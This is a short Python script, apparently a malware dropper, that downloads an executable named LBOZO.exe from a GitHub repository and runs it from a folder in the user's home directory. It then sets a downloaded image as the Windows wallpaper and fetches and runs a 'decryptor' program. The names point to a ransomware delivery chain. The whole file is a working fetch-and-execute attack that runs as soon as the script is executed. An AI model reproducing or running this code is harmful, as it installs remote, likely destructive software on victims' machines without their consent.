import os
import ctypes


def dropnrun(programname):
    path = os.path.expanduser("~")
    os.chdir(path)
    if os.path.exists(os.path.join(path, programname)):
        pass
    else:
        os.mkdir(programname)
    os.chdir(programname)
    os.system("curl -OL https://github.com/Frikallo/LBOZO/raw/main/out/LBOZO.exe")
    finaldest = os.getcwd()
    with open("LBOZO.exe", "rb") as f:
        LBOZO = f.read()
    with open(f"{finaldest}/LBOZO.exe", "wb") as f:
        f.write(LBOZO)

    command = "{}".format(f"{finaldest}/LBOZO.exe")
    os.system(command)

    os.system("curl -OL https://github.com/Frikallo/LBOZO/raw/main/out/wallpaper.jpg")

    ctypes.windll.user32.SystemParametersInfoA(
        20, 0, os.path.abspath(f"{finaldest}/wallpaper.jpg").encode(), 3
    )

    os.system(
        "curl -OL https://github.com/Frikallo/LBOZO/raw/main/out/LBOZODecryptor.exe"
    )
    with open("LBOZODecryptor.exe", "rb") as f:
        LBOZOdecryptor = f.read()
    with open(f"{finaldest}/LBOZODecryptor.exe", "wb") as f:
        f.write(LBOZOdecryptor)
    command = "{}".format(f"{finaldest}/LBOZODecryptor.exe")
    os.system(command)


dropnrun("LBOZO")
